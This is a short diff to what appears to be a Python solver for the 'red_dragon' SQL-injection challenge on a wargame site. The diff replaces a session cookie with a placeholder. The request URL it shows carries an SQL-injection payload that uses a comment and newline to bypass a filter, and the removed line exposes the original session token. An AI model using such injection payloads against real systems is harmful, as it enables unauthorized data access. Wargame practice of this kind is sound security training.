@@ -1,6 +1,6 @@
 import requests
 
-cookie = {'PHPSESSID' : 'k1v4kvght7rno677jlk709rl1r'}
+cookie = {'PHPSESSID' : '~~~~'}
 
 def dist_tf(num):
     url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no<%%23&no=%%0a%d" % (num)
